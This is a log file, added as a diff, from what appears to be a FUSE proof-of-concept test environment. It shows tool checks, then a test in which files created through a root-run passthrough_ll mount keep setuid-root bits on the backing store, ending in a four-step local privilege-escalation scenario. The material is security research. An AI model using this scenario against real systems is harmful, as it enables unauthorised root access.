@@ -1,0 +1,91 @@
+[entrypoint] SSH daemon started
+[entrypoint] MinIO started (PID=10)
+[entrypoint] MinIO bucket 'testbucket' ready
+
+==========================================
+  FUSE PoC 环境验证
+==========================================
+
+[OK]   fusermount3 --version
+[OK]   passthrough_ll --help
+[OK]   s3fs --version
+[OK]   sshfs --version
+[OK]   gocryptfs --version
+[OK]   fuse-overlayfs --help
+[OK]   mergerfs --version
+[OK]   ntfs-3g --version
+[OK]   virtiofsd --version
+[OK]   MinIO 健康检查
+[OK]   SSH localhost
+[OK]   setfattr --help
+
+==========================================
+  目录结构
+==========================================
+
+/workspace/poc
+/workspace/poc/b_results
+/workspace/poc/create_mode
+/workspace/poc/create_mode/backing
+/workspace/poc/create_mode/mnt
+/workspace/poc/setxattr_flags
+/workspace/poc/setxattr_flags/backing
+/workspace/poc/setxattr_flags/mnt
+/workspace/poc/setxattr_flags/s3data
+/workspace/poc/setxattr_flags/s3data/.minio.sys
+/workspace/poc/setxattr_flags/s3data/.minio.sys/buckets
+/workspace/poc/setxattr_flags/s3data/.minio.sys/config
+/workspace/poc/setxattr_flags/s3data/.minio.sys/config/config.json
+/workspace/poc/setxattr_flags/s3data/.minio.sys/config/iam
+/workspace/poc/setxattr_flags/s3data/.minio.sys/config/iam/format.json
+/workspace/poc/setxattr_flags/s3data/.minio.sys/multipart
+/workspace/poc/setxattr_flags/s3data/.minio.sys/pool.bin
+/workspace/poc/setxattr_flags/s3data/.minio.sys/tmp
+/workspace/poc/setxattr_flags/s3data/.minio.sys/tmp/.trash
+
+==========================================
+  环境就绪，可进入容器进行 PoC 测试
+==========================================
+
+=== FUSE CREATE mode S_ISUID PoC ===
+
+[1] Starting passthrough_ll as root with backing store: /tmp/fuse_backing
+    Daemon PID=62, mountpoint=/mnt/fuse
+
+[2] Creating test file with mode=04711 (S_ISUID|S_IXUSR|S_IXGRP|S_IXOTH|S_IRUSR|S_IWUSR) via FUSE mountpoint
+    Compiled helper program
+Created file /mnt/fuse/setuid_test_file with requested mode=04711 (octal)
+
+[3] Checking file permissions on FUSE mountpoint:
+    Mountpoint: mode=4711 uid=0 gid=0
+
+[4] Checking file permissions on BACKING STORE (the critical check):
+    Backing:    mode=4711 uid=0 gid=0
+
+[5] Detailed analysis:
+    Raw mode (hex): 0x89c9
+    Octal mode:     4711
+    File owner UID: 0
+    S_ISUID bit:    YES
+    S_ISGID bit:    NO
+
+=========================================
+RESULT: VULNERABLE
+
+The backing store file has S_ISUID bit SET and is owned by root (UID=0).
+This means a non-privileged user could create a setuid-root executable
+via the FUSE mountpoint, leading to local privilege escalation.
+
+Attack scenario:
+  1. Root runs passthrough_ll with -o allow_other
+  2. Unprivileged user creates file with mode=04711 on mountpoint
+  3. Backing store file becomes root-owned + setuid
+  4. User executes the file -> gets root privileges
+=========================================
+
+[6] Additional test: creating file with S_ISGID (02711)
+Created file /mnt/fuse/setgid_test_file with requested mode=02711
+    Backing store: mode=2711 uid=0 gid=0
+    S_ISGID bit: YES (also not filtered)
+
+=== PoC Complete ===
